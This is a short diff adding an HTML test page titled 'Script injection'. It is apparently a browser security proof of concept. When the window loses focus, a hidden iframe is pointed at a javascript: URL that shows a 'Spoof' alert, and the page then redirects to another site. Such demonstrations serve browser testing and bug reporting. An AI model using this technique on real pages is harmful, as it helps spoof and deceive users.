@@ -1,0 +1,30 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, user-scalable=no">
+<title>Script injection</title>
+
+<style>
+iframe {
+visibility: hidden;
+}
+</style>
+
+<script>
+
+window.onblur = function() {
+document.getElementById("iframe").src = "javascript:alert('Spoof');";
+location.replace("https://stackoverflow.com");
+}
+</script>
+</head>
+
+<body>
+   <center>
+<br>
+</center>
+   <iframe id="iframe"></iframe>
+</body>
+
+</html>
